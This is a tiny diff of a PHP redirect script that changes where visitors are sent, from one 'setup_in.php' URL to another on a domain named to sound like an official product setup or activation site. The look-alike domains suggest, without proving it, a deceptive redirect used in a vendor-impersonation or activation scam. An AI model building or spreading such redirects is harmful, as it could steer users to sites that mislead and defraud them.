@@ -1,4 +1,4 @@
 <?php
-header("Location: https://start-your-product.site/actofc/setup_in.php");
+header("Location: https://official-setup-activate.site/actnor/setup_in.php");
 die();
 ?>
